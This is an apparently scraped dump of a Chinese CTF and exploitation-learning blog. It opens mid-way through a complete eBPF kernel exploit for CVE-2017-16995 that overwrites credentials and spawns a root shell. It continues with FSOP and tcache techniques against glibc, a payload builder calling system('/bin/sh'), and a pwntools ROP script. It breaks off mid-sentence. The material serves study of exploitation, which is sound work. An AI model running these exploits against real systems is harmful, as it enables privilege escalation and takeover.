BPF_MAP_UPDATE_ELEM, &amp;attr, sizeof(attr));&#125;static int bpf_lookup_elem(void *key, void *value)&#123;\tunion bpf_attr attr = &#123;\t\t.map_fd = mapfd,\t\t.key = (__u64)key,\t\t.value = (__u64)value,\t&#125;;\treturn syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &amp;attr, sizeof(attr));&#125;static void __exit(char *err)&#123;\tfprintf(stderr, &quot;error: %s\\n&quot;, err);\texit(-1);&#125;static void prep(void)&#123;\tmapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), 3);\tif (mapfd &lt; 0)\t\t__exit(strerror(errno));\tputs(&quot;mapfd finished&quot;);\tprogfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,\t\t\t\t\t\t   (struct bpf_insn *)__prog, PROGSIZE, &quot;GPL&quot;, 0);\tif (progfd &lt; 0)\t\t__exit(strerror(errno));\tputs(&quot;bpf_prog_load finished&quot;);\tif (socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets))\t\t__exit(strerror(errno));\tputs(&quot;socketpair finished&quot;);\tif (setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, sizeof(progfd)) &lt; 0)\t\t__exit(strerror(errno));\tputs(&quot;setsockopt finished&quot;);&#125;static void writemsg(void)&#123;\tchar buffer[64];\tssize_t n = write(sockets[0], buffer, sizeof(buffer));\tif (n &lt; 0)\t&#123;\t\tperror(&quot;write&quot;);\t\treturn;\t&#125;\tif (n != sizeof(buffer))\t\tfprintf(stderr, &quot;short write: %lu\\n&quot;, n);&#125;#define __update_elem(a, b, c) \\\tbpf_update_elem(0, (a));   \\\tbpf_update_elem(1, (b));   \\\tbpf_update_elem(2, (c));   \\\twritemsg();static uint64_t get_value(int key)&#123;\tuint64_t value;\tif (bpf_lookup_elem(&amp;key, &amp;value))\t\t__exit(strerror(errno));\treturn value;&#125;static uint64_t __get_fp(void)&#123;\t__update_elem(1, 0, 0);\treturn get_value(2);&#125;static uint64_t __read(uint64_t addr)&#123;\t__update_elem(0, addr, 0);\treturn get_value(2);&#125;static void __write(uint64_t addr, uint64_t val)&#123;\t__update_elem(2, addr, val);&#125;static uint64_t get_sp(uint64_t addr)&#123;\treturn addr &amp; ~(0x4000 - 1);&#125;static void pwn(void)&#123;\tuint64_t fp, sp, task_struct, credptr, uidptr;\tfp = __get_fp();\tif (fp &lt; PHYS_OFFSET)\t\t__exit(&quot;bogus fp&quot;);\tsp = get_sp(fp);\tif (sp &lt; PHYS_OFFSET)\t\t__exit(&quot;bogus sp&quot;);\ttask_struct = __read(sp);\tif (task_struct &lt; PHYS_OFFSET)\t\t__exit(&quot;bogus task ptr&quot;);\tprintf(&quot;task_struct = %lx\\n&quot;, task_struct);\tcredptr = __read(task_struct + CRED_OFFSET); // cred\tif (credptr &lt; PHYS_OFFSET)\t\t__exit(&quot;bogus cred ptr&quot;);\tuidptr = credptr + UID_OFFSET; // uid\tif (uidptr &lt; PHYS_OFFSET)\t\t__exit(&quot;bogus uid ptr&quot;);\tprintf(&quot;uidptr = %lx\\n&quot;, uidptr);\t__write(uidptr, 0); // set both uid and gid to 0\tif (getuid() == 0)\t&#123;\t\tprintf(&quot;spawning root shell\\n&quot;);\t\tsystem(&quot;id&quot;);\t\tsystem(&quot;/bin/sh&quot;);\t\texit(0);\t&#125;\t__exit(&quot;not vulnerable?&quot;);&#125;int main(int argc, char **argv)&#123;\tprep();\tpwn();\treturn 0;&#125;\n\n\n这里exp我是直接用的原文的exp，因为理解漏洞之后操作起来就比较简单了，主要麻烦的就是构造eBPF指令\n\n题目放在:https://github.com/196082/196082\n参考文章:http://p4nda.top/2019/01/18/CVE-2017-16995/#do-check\n","categories":["kernel-pwn","CVE"],"tags":["ebpf"]},{"title":"FSOP","url":"/2022/02/23/FSOP/","content":"文章开头给出_IO_FILE结构体的偏移:\n0x0   _flags0x8   _IO_read_ptr0x10  _IO_read_end0x18  _IO_read_base0x20  _IO_write_base0x28  _IO_write_ptr0x30  _IO_write_end0x38  _IO_buf_base0x40  _IO_buf_end0x48  _IO_save_base0x50  _IO_backup_base0x58  _IO_save_end0x60  _markers0x68  _chain0x70  _fileno0x74  _flags20x78  _old_offset0x80  _cur_column0x82  _vtable_offset0x83  _shortbuf0x88  _lock0x90  _offset0x98  _codecvt0xa0  _wide_data0xa8  _freeres_list0xb0  _freeres_buf0xb8  __pad50xc0  _mode0xc4  _unused20xd8  vtable\n\nGlibc2.23下的FSOPFSOP全称是File Stream Oriented Programming进程中打开的所有文件结构体使用一个单链表来进行管理，即通过_IO_list_all进行管理，在fopen的分析中，我们知道了fopen是通过_IO_link_in函数将新打开的结构体链接进入_IO_list_all的，相关的代码如下：\nfp-&gt;file._flags |= _IO_LINKED;...fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;_IO_list_all = fp;\n\n从代码中也可以看出来链表是通过FILE结构体的_chain字段来进行链接的。所以也就形成了链表。\n看到链表的操作，应该就大致猜到了FSOP的主要原理了。即通过伪造_IO_list_all中的节点来实现对FILE链表的控制以实现利用目的。通常来说一般是直接利用任意写的漏洞修改_IO_list_all直接指向可控的地址。\n具体来说该如何利用呢？glibc中有一个函数_IO_flush_all_lockp，该函数的功能是刷新所有FILE结构体的输出缓冲区，相关源码如下，文件在libio\\genops中：\nint_IO_flush_all_lockp (int do_lock)&#123;  int result = 0;  struct _IO_FILE *fp;  int last_stamp;  fp = (_IO_FILE *) _IO_list_all;  while (fp != NULL)    &#123;    ...      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T     || (_IO_vtable_offset (fp) == 0         &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr            &gt; fp-&gt;_wide_data-&gt;_IO_write_base))#endif     )    &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)  result = EOF;        fp = fp-&gt;_chain;    &#125;...&#125;\n\n通过对上面代码的分析我们知道fp-&gt;_IO_write_base处保存这输出缓冲区的数据，并且长度为fp-&gt;_IO_write_ptr-fp-&gt;_IO_write_base，所以上面的if语句实际上就是判断缓冲区是否还有数据，如果有的话就会调用_IO_OVERFLOW去清空缓冲区，其中_IO_OVERFLOW是vtable当中的函数，所以我们若是能够控制_IO_list_all的话就可以控制程序执行流。\n而_IO_flush_all_lockp 不需要攻击者手动调用，在一些情况下这个函数会被系统调用：\n\n当 libc 执行 abort 流程时\n\n当执行 exit 函数时\n\n当执行流从 main 函数返回时\n\n\n利用方式伪造_IO_FILE结构体，并且利用漏洞使_IO_list_all指向我们伪造的结构体(当然这里我们可以使用任意结构体_chain字段)，最终触发_IO_flush_all_lockp，绕过检查实现执行流的劫持。\n其中需要绕过的也就是上面的缓冲区，所以只需要\n\nfp-&gt;_mode = 0;\nfp-&gt;_IO_write_ptr = 1;\nfp-&gt;_IO_write_base=0;\n\n最后把vtable修改为我们的system就好。\nGlibc2.24到Glibc2.27下的FSOP在Glibc2.24下，若是直接同上面的构造方式构造就会出现报错，这是因为在这个版本的Glibc下存在一种保护机制。\nvtable check机制分析在执行_IO_OVERLOW时，会先执行到IO_validate_vtable函数，这是因为_IO_OVERLOW的宏定义发生了改变\n#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)\n\n#define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)\n\n# define _IO_JUMPS_FUNC(THIS) \\  (IO_validate_vtable                                                   \\   (*(struct _IO_jump_t **) ((void *) &amp;_IO_JUMPS_FILE_plus (THIS)   \\                 + (THIS)-&gt;_vtable_offset)))\n\n可以看到是在最后调用vtable的函数之前调用了IO_validate_vtable函数。\nstatic inline const struct _IO_jump_t *IO_validate_vtable (const struct _IO_jump_t *vtable)&#123;  uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;  const char *ptr = (const char *) vtable;  uintptr_t offset = ptr - __start___libc_IO_vtables;  if (__glibc_unlikely (offset &gt;= section_length))    /* The vtable pointer is not in the expected section.  Use the       slow path, which will terminate the process if necessary.  */    _IO_vtable_check ();  return vtable;&#125;\n\n在上述代码当中，__start___libc_IO_vtables指向了第一个vtable的地址_IO_helper_jumps，__stop___libc_IO_vtables指向了最后一个vtable函数_IO_str_chk_jumps的结束地址。上面检验的就是当前的vtable是否在这两个地址之间。因此，简单的覆盖vtable是无法通过检查的。\n利用方式其实在上述的check机制分析当中还存在一个检查外部vtable是否合法，不过存在的问题是我们无法控制flag，因为其是随机产生的。所以，我们使用的利用方式还是内部的vtable，使用到了vtable是_IO_str_jumps。\n首先观察其源码当中定义的函数表：\nconst struct _IO_jump_t _IO_str_jumps libio_vtable =&#123;  JUMP_INIT_DUMMY,  JUMP_INIT(finish, _IO_str_finish),  JUMP_INIT(overflow, _IO_str_overflow),  JUMP_INIT(underflow, _IO_str_underflow),  JUMP_INIT(uflow, _IO_default_uflow),  JUMP_INIT(pbackfail, _IO_str_pbackfail),  JUMP_INIT(xsputn, _IO_default_xsputn),  JUMP_INIT(xsgetn, _IO_default_xsgetn),  JUMP_INIT(seekoff, _IO_str_seekoff),  JUMP_INIT(seekpos, _IO_default_seekpos),  JUMP_INIT(setbuf, _IO_default_setbuf),  JUMP_INIT(sync, _IO_default_sync),  JUMP_INIT(doallocate, _IO_default_doallocate),  JUMP_INIT(read, _IO_default_read),  JUMP_INIT(write, _IO_default_write),  JUMP_INIT(seek, _IO_default_seek),  JUMP_INIT(close, _IO_default_close),  JUMP_INIT(stat, _IO_default_stat),  JUMP_INIT(showmanyc, _IO_default_showmanyc),  JUMP_INIT(imbue, _IO_default_imbue)&#125;;\n\n上面是我在Glibc源码当中看到的，下面是我调试出来的：\n\n不过可以看到的是源码中的JUMP_INIT_DUMMY占了16字节。所以_IO_str_finish的偏移量为0x10，而_IO_str_overflow的偏移量为0x18。\n再来看_IO_str_finish的源码：\nvoid_IO_str_finish (_IO_FILE *fp, int dummy)&#123;  if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);   fp-&gt;_IO_buf_base = NULL;  _IO_default_finish (fp, 0);&#125;\n\n可以看到直接使用了fp-&gt;_s._free_buffer当作函数地址，参数即为_IO_buf_base。到了这一步，利用方式就很明显了。\n下面构造结构体，同样的，我们仍需要绕过之前_IO_flush_all_lokcp函数中的检测，也就是_mode&lt;=0以及_IO_write_ptr&gt;_IO_write_base。然后重点就是vtable的地址我们不能直接的_IO_str_jumps，我们应当写入_IO_str_jumps-8，这里解释一下，因为我们在绕过_IO_flush_all_lokcp的检查后会调用到_IO_OVERFLOW函数，但是我们真正要进入的其实是_IO_str_finish函数，又因为他相对与vtable的偏移量刚好比_IO_OVERFLOW小8个字节，所以减去8即可执行到_IO_str_finish。\n接着问题就是(((_IO_strfile *) fp)-&gt;_s._free_buffer)函数相对于fp的偏移量是多少，调试结果出来发现偏移量是0xe8，最后在fp-&gt;_IO_buf_base的地方写上/bin/sh的地址即可getshell。\n这里给出打包的函数：\ndef pack_file(_IO_read_base=0, _IO_write_base=0, _IO_write_ptr=0, _IO_buf_base=0, _mode=0, vtable=0):    IO_FILE = p64(0)*3+p64(_IO_read_base) + \\        p64(_IO_write_base)+p64(_IO_write_ptr)+p64(0)+p64(_IO_buf_base)    IO_FILE = IO_FILE.ljust(0xc0, b&#x27;\\x00&#x27;)    IO_FILE += p32(_mode)    IO_FILE = IO_FILE.ljust(0xd8, b&#x27;\\x00&#x27;)+p64(vtable)    return IO_FILEfile_struct = pack_file(IO_list_all, 0, 1, bin_sh_addr, 0, IO_str_jumps-8)file_struct += p64(0)+p64(system_addr)\n\n这是我上一篇复现的exp当中的函数，我是根据其他师傅的exp写的，但是这里的_IO_read_base我也没在源码中看到有什么检验，我估计不用加上也行。\nGlibc2.29下的FSOP这应该是最后一个可以用FSOP的版本了，在Glibc2.31也会有这方面的使用，不过都不能直接getshell了。\n首先注意的是，我们在上面使用的是_IO_str_finish函数来利用的，但是这里的函数源码发生了改变：\nvoid_IO_str_finish (FILE *fp, int dummy)&#123;  if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))    free (fp-&gt;_IO_buf_base);  fp-&gt;_IO_buf_base = NULL;  _IO_default_finish (fp, 0);&#125;\n\n可以看到这里直接替换成了free，所以我们这里是没有利用空间的了。\n其他师傅的查找发现在_IO_wfile_jumps这个vtable里依旧存在大量的函数指针，而且当中最好利用的则是_IO_wfile_sync函数，一样的先看一下源码：\nwint_t_IO_wfile_sync (FILE *fp)&#123;  ssize_t delta;  wint_t retval = 0;  /*    char* ptr = cur_ptr(); */  if (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)    if (_IO_do_flush (fp))      return WEOF;  delta = fp-&gt;_wide_data-&gt;_IO_read_ptr - fp-&gt;_wide_data-&gt;_IO_read_end;  if (delta != 0)    &#123;      /* We have to find out how many bytes we have to go back in the\t external buffer.  */      struct _IO_codecvt *cv = fp-&gt;_codecvt;      off64_t new_pos;      int clen = (*cv-&gt;__codecvt_do_encoding) (cv);      if (clen &gt; 0)\t/* It is easy, a fixed number of input bytes are used for each\t   wide character.  */\tdelta *= clen;      else\t&#123;\t  /* We have to find out the hard way how much to back off.\t     To do this we determine how much input we needed to\t     generate the wide characters up to the current reading\t     position.  */\t  int nread;\t  fp-&gt;_wide_data-&gt;_IO_state = fp-&gt;_wide_data-&gt;_IO_last_state;\t  nread = (*cv-&gt;__codecvt_do_length) (cv, &amp;fp-&gt;_wide_data-&gt;_IO_state,\t\t\t\t\t      fp-&gt;_IO_read_base,\t\t\t\t\t      fp-&gt;_IO_read_end, delta);\t  fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_base + nread;\t  delta = -(fp-&gt;_IO_read_end - fp-&gt;_IO_read_base - nread);\t&#125;      new_pos = _IO_SYSSEEK (fp, delta, 1);      if (new_pos != (off64_t) EOF)\t&#123;\t  fp-&gt;_wide_data-&gt;_IO_read_end = fp-&gt;_wide_data-&gt;_IO_read_ptr;\t  fp-&gt;_IO_read_end = fp-&gt;_IO_read_ptr;\t&#125;      else if (errno == ESPIPE)\t; /* Ignore error from unseekable devices. */      else\tretval = WEOF;    &#125;  if (retval != WEOF)    fp-&gt;_offset = _IO_pos_BAD;  /* FIXME: Cleanup - can this be shared? */  /*    setg(base(), ptr, ptr); */  return retval;&#125;\n\n可以注意到的是这两行代码：\nstruct _IO_codecvt *cv = fp-&gt;_codecvt;int clen = (*cv-&gt;__codecvt_do_encoding) (cv);\n\n这里又是将fp-&gt;_codecvt-&gt;__codecvt_do_encoding来做为函数来执行，参数则是fp-&gt;_codecvt\n再看_IO_codecvt结构体在源码是什么样子：\nstruct _IO_codecvt&#123;  void (*__codecvt_destr) (struct _IO_codecvt *);  enum __codecvt_result (*__codecvt_do_out) (struct _IO_codecvt *,\t\t\t\t\t     __mbstate_t *,\t\t\t\t\t     const wchar_t *,\t\t\t\t\t     const wchar_t *,\t\t\t\t\t     const wchar_t **, char *,\t\t\t\t\t     char *, char **);  enum __codecvt_result (*__codecvt_do_unshift) (struct _IO_codecvt *,\t\t\t\t\t\t __mbstate_t *, char *,\t\t\t\t\t\t char *, char **);  enum __codecvt_result (*__codecvt_do_in) (struct _IO_codecvt *,\t\t\t\t\t    __mbstate_t *,\t\t\t\t\t    const char *, const char *,\t\t\t\t\t    const char **, wchar_t *,\t\t\t\t\t    wchar_t *, wchar_t **);  int (*__codecvt_do_encoding) (struct _IO_codecvt *);  int (*__codecvt_do_always_noconv) (struct _IO_codecvt *);  int (*__codecvt_do_length) (struct _IO_codecvt *, __mbstate_t *,\t\t\t      const char *, const char *, size_t);  int (*__codecvt_do_max_length) (struct _IO_codecvt *);  _IO_iconv_t __cd_in;  _IO_iconv_t __cd_out;&#125;;\n\n可以看到这里的__codecvt_do_encoding偏移量为4，所以要进行利用只需要满足以下条件：\n1.fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base2.fp-&gt;_wide_data-&gt;_IO_read_ptr - fp-&gt;_wide_data-&gt;_IO_read_end3.*(fp-&gt;_codecvt+4)=func,参数就是fp-&gt;_codecvt\n\n当然，我们这里依旧需要绕过_IO_flush_all_lokcp函数。\n后面会在梳理house_of_pig也就是在Glibc2.31下的利用。\n\n参考文章https://darkeyer.github.io/2020/08/17/FSOP%E5%9C%A8glibc2.29%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/\nhttps://xz.aliyun.com/t/5579\n","categories":["pwn"],"tags":["FSOP"]},{"title":"GLIBC 2.35 hook","url":"/2022/11/04/GLIBC2-35-hook/","content":"引言众所周知在高版本的glibc中取消了free_hook和malloc_hook都被删除掉了。\n那么如果我们存在一个UAF漏洞但是只能申请size为0x20的chunk时就会显得十分窘迫，如果使用选择使用house of emma或者house of apple之类的攻击手法我们就需要花费大量的chunk来进行利用。\n根据上述情况来说就目前我们已学的知识中可以使用exit_hook进行解决，不过就在今天在微信公众号中刷到一篇文章中提到了一篇文章，通过修改_rtld_global._dl_ns._ns_loaded实现劫持程序执行流。\n分析\n如上图所示，在通过exit函数或者程序正常退出时会调用fini_array中的函数\n\n再从这张图中可以看到fini_array中的函数也正是house of banana中提到的_dl_fini函数中调用的，并且可以看到是在\n_rtld_global._dl_ns._ns_loaded这个位置取出程序基地址，随后根据右边的偏移确定fini_array的位置，所以我们可以通过修改上述地址的内容到我们期望的位置即可劫持了。\n\n参考文章：https://www.freebuf.com/articles/system/345968.html\n","categories":["pwn"],"tags":["堆利用","hook"]},{"title":"GFCTF2021复现","url":"/2022/01/11/GFCTF/","content":"深刻感觉到了这场比赛的难度，要是参加了的话我可能第一道题都完成不了。这次只复现了前面两道，因为第三题考得更多的是代码审计能力吧。\nshell题目保护只开了nx，主函数也是很简单的栈溢出。\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char buf[16]; // [rsp+0h] [rbp-10h] BYREF  system(&quot;echo &#x27;zltt lost his shell, can you find it?&#x27;&quot;);  read(0, buf, 0x38uLL);  return 0;&#125;\n\n但是问题是题目没有泄漏函数。所以这里存在一个冷知识\n\nsystem(“$0”)同样可以拿到shell\n\n在ida发现tip函数存在\n\ntext段可以即可拿到shell\nfrom pwn import *elf = ELF(&#x27;./shell&#x27;)# r = process(&#x27;./shell&#x27;)r = remote(b&#x27;1.14.71.254&#x27;, 28087)context.log_level = &#x27;debug&#x27;system = elf.plt[&#x27;system&#x27;]pop_rdi = 0x00000000004005e3shell_addr = 0x400541ret = 0x0000000000400416r.recvuntil(b&quot;\\n&quot;)payload = b&#x27;a&#x27;*(0x10+0x8)+p64(pop_rdi)+p64(shell_addr) + \\    p64(0x0000000000400416)+p64(system)r.sendline(payload)r.sendline(b&#x27;cat flag&#x27;)r.interactive()\n\nlook_face_no_patch所需知识点：tcache struct attack,_IO_FILE leak\n这个题目有点绕，不过先把知识点掌握了就好。\ntcache struct attack我这里主要是我自己总结可能阐述不是特别清楚所以看不懂的话可以看https://xz.aliyun.com/t/6828 这篇文章。\n字面意思也就是攻击tcache结构体。\n在做长安战役的比赛的off by one那道题目时我就在想，为什么我malloc一个chunk的时候要多出来一个0x250大小的chunk呢，现在知道这个chunk就是tcache的结构体。\n和unsortedbin里面存的main_arena不同的是tcache的结构体就直接放在heap段的第一个。\n\n可以看到上面的0x251大小的就是tcache结构体，再执行到free然后观察其内部结构。\n(因为刚刚的0x80不具有演示效果我改了一下)\n\n可以看见在tcache struct中heap_base+0x10–&gt;heap_base+0x50之间是存放的counts，而heap_base+0x50–&gt;heap_base+0x250之间存放的这是tcache_entry指针。\n利用方式首先利用double free\n\n此时chunk的fd指针指向的是他本身，而我们已知的tcache struct是在heap_base的位置所以只需要修改后面三位为010(这里是因为tcache_entry指向的是和malloc返回的指针只想同一个位置也就是heap_addr+0x10)所以我们只需要爆破第四位即可，那我们成功的概率也就是1/16。当我们爆破成功之后我们此时malloc两次chunk我们就可以得到tcache的结构体，将前面的内容全部填充为0xff即可绕过tcache，让后面free的chunk进入unsorted bin。\n_IO_FILE leak在我的这一篇博客提到过_IO_FILE write https://cv196082.gitee.io/2021/12/06/echo-back/ 不了解结构体可以先去看一下。\n当然同上面知识点一样，我也只是对于自己的总结可能阐述不清楚，若仍有困惑之处请看这位大师傅的 https://blog.wjhwjhn.com/archives/95/\n我写的那一篇博客提到过，内存中存在着三个文件指针，分别是stderr，stdout，stdin。\n\n这三个文件指针一般存放在bss段上用于输出输入数据，所指向的内容在libc中，而结构体内部的内容是可以被修改的，所以当我们有任意地址写的权限是就可以修改结构体实现stdout leak。下面就是stdout的内部结构：\n\n我们需要修改的是_flags和_IO_write_base，在这之间的三个指针，我们覆盖_IO_write_base势必会覆盖掉它们，但是这是stdout，而上面这三个主要是输入的时候才会有用，所以直接覆盖成p64(0)即可。\ncopy:解释以上指针的作用\n\n其中_IO_buf_base 和_IO_buf_end 是缓冲区建立函数。_IO_doallocbuf 会在里面建立输入输出缓冲区，并把基地址保存在_IO_buf_base 中，结束地址保存在_IO_buf_end 中。在建立里输入输出缓冲区后，如果缓冲区作为输出缓冲区使用，会将基址址给_IO_write_base，结束地址给_IO_write_end，同时_IO_write_ptr 表示为已经使用的地址。即_IO_write_base 到_IO_write_ptr 之间的空间是已经使用的缓冲区，_IO_write_ptr 到_IO_write_end 之间为剩余的输出缓冲区。\n\n所以根据以上说法的话，我们只需要将_IO_write_base调小即可输入_IO_write_base与_IO_write_ptr之间的内容。\n_flags为什么也要修改？/* Magic number and bits for the _flags field.  The magic number ismostly vestigial, but preserved for compatibility.  It occupies thehigh 16 bits of _flags; the low 16 bits are actual flag bits.  */#define _IO_MAGIC         0xFBAD0000 /* Magic number */#define _IO_MAGIC_MASK    0xFFFF0000#define _IO_USER_BUF          0x0001 /* Don&#x27;t deallocate buffer on close. */#define _IO_UNBUFFERED        0x0002#define _IO_NO_READS          0x0004 /* Reading not allowed.  */#define _IO_NO_WRITES         0x0008 /* Writing not allowed.  */#define _IO_EOF_SEEN          0x0010#define _IO_ERR_SEEN          0x0020#define _IO_DELETE_DONT_CLOSE 0x0040 /* Don&#x27;t call close(_fileno) on close.  */#define _IO_LINKED            0x0080 /* In the list of all open files.  */#define _IO_IN_BACKUP         0x0100#define _IO_LINE_BUF          0x0200#define _IO_TIED_PUT_GET      0x0400 /* Put and get pointer move in unison.  */#define _IO_CURRENTLY_PUTTING 0x0800#define _IO_IS_APPENDING      0x1000#define _IO_IS_FILEBUF        0x2000/* 0x4000  No longer used, reserved for compat.  */#define _IO_USER_LOCK         0x8000\n\n上面是glibc中给出的常量。\n以puts函数输出的真正调用为例，具体调用的顺序是:\n_IO_puts -&gt; _IO_sputn -&gt; _IO_new_file_xsputn -&gt; _IO_overflow -&gt; _IO_new_file_overflow\n其中检查较为重要的是_IO_new_file_overflow函数。\nif (f-&gt;_flags &amp; _IO_NO_WRITES) / SET ERROR /&#123;    f-&gt;_flags |= _IO_ERR_SEEN;    __set_errno (EBADF);    return EOF;&#125;\n\n_IO_NO_WRITES使用于检验是否可以输出数据的，为1表示禁止，为0表示允许。这个_IO_NO_WRITES在stdout当中为0，在stdin当中为1。根据上面的表达式其实可以看出来我们必须满足 (f-&gt;_flags &amp; _IO_NO_WRITES)==0\n后面检测_IO_CURRENTLY_PUTTING\nif ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)&#123;    /* Allocate a buffer if needed. */    if (f-&gt;_IO_write_base == NULL)    &#123;        _IO_doallocbuf(f);        _IO_setg(f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);    &#125;    /* Otherwise must be currently reading.    If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,    logically slide the buffer forwards one block (by setting the    read pointers to all point at the beginning of the block).  This    makes room for subsequent output.    Otherwise, set the read pointers to _IO_read_end (leaving that    alone, so it can continue to correspond to the external position). */    if (__glibc_unlikely(_IO_in_backup(f)))    &#123;        size_t nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;        _IO_free_backup_area(f);        f-&gt;_IO_read_base -= MIN(nbackup,                                f-&gt;_IO_read_base - f-&gt;_IO_buf_base);        f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;    &#125;    if (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)        f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;    f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;    f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;    f-&gt;_IO_write_end = f-&gt;_IO_buf_end;    f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;    f-&gt;_flags |= _IO_CURRENTLY_PUTTING;    if (f-&gt;_mode &lt;= 0 &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))        f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;&#125;\n\n主要关心的是_IO_CURRENTLY_PUTTING，这个使用来判断是否初始化的，若是没有初始化过则为0，若是初始化过则为1，一般输出过内容之后就变成了1除非它输出任何东西。如果这里没通过那我们的_IO_write_base会被修改那就达不到泄漏的目的，所以我们要满足 (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)==1\n最后一个检测\nif (do_write)&#123;    count = new_do_write (f, s, do_write);    to_do -= count;    if (count &lt; do_write)    return n - to_do;&#125;\n\n这一部分是进入new_do_write (f, s, do_write);函数。\nstatic size_tnew_do_write(FILE *fp, const char *data, size_t to_do)&#123;    size_t count;    if (fp-&gt;_flags &amp; _IO_IS_APPENDING)        /* On a system without a proper O_APPEND implementation,        you would need to sys_seek(0, SEEK_END) here, but is        not needed nor desirable for Unix- or Posix-like systems.        Instead, just indicate that offset (before and after) is        unpredictable. */        fp-&gt;_offset = _IO_pos_BAD;    else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)    &#123;        off64_t new_pos = _IO_SYSSEEK(fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1);        if (new_pos == _IO_pos_BAD)            return 0;        fp-&gt;_offset = new_pos;    &#125;    count = _IO_SYSWRITE(fp, data, to_do);    if (fp-&gt;_cur_column &amp;&amp; count)        fp-&gt;_cur_column = _IO_adjust_column(fp-&gt;_cur_column - 1, data, count) + 1;    _IO_setg(fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);    fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;    fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= 0 &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))                             ? fp-&gt;_IO_buf_base                             : fp-&gt;_IO_buf_end);    return count;&#125;\n\n这里需要注意的是这两个这两句\nif (fp-&gt;_flags &amp; _IO_IS_APPENDING)\nelse if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)\n我们这里无论进入那一个语句都是可以执行到下面的，但是一般来说我们都会选择进入第一个因为他内部的代码较少，只有一行。\n所以根据上面的结论来说我的可以计算出_flags的值。\n1.(fp-&gt;_flags &amp; _IO_NO_WRITES) == 02.(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 13.(fp-&gt;_flags &amp; _IO_IS_APPENDING) == 1\n\n计算可得，fp-&gt;_flags = 0xfbad1800, 其中_IO_MAGIC = 0xfdab0000，这是个 Magic Number，是固定的。\n一般的利用方式一般是将chunk释放进unsorted bin当中，是chunk保存main_arena，然后利用partial overwrite爆破出_IO_2_1_stdout_结构体的位置，随后就是根据上面得出来的值得到_IO_2_1_stdout_的地址来获取libc\n解题有了以上的基础我们才可以正式开始看这道题目。\n检查保护\n保护全开，好样的！\n流程分析题目类型是很常规的菜单题，但是没有edit函数和show函数。先看add函数\nunsigned __int64 add()&#123;  int i; // [rsp+8h] [rbp-498h]  int v2; // [rsp+Ch] [rbp-494h]  char s[1160]; // [rsp+10h] [rbp-490h] BYREF  unsigned __int64 v4; // [rsp+498h] [rbp-8h]  v4 = __readfsqword(0x28u);  memset(s, 0, 0x80uLL);  puts(&quot;cont...&quot;);  v2 = read(0, s, 0x78uLL);  if ( v2 &gt; 112 || v2 &lt; 0 )    run();  s[v2] = 10;  ptr = malloc(v2);  for ( i = 0; s[i] != 10; ++i )    *((_BYTE *)ptr + i) = s[i];  puts(&quot;OK&quot;);  return v4 - __readfsqword(0x28u);&#125;\n\n这里我们malloc的chunk的size是由我们输入的内容长度确定的，而下面的for循环，是将数据写进去，当出现b’\\n’时就会结束循环停止写入。\n再看dele函数\nint dele()&#123;  if ( !ptr )    run();  if ( (unsigned int)dele_time &gt; 2 )    run();  free(ptr);  ++dele_time;  return puts(&quot;OK&quot;);&#125;\n\n这个题很怪的一点就是我们只能删除当前创建的chunk并且总共只能删除三次，而且nssctf贴心的告诉了我们题目运行的环境是ubuntu18那libc版本就是2.27那就代表存在tcache，在不知道tcache struct attack的情况就直接想放弃了。\n利用分析\n首先利用double free让我们创建chunk的fd指针只想自身。\n\n可以看到我们利用爆破最后一个字节修改了tcache struct当中记录counts的值，再观察一下bin的情况\n\n后面也是一样的。接着我们释放chunk，此时储存tcache struct的chunk进入unsorted 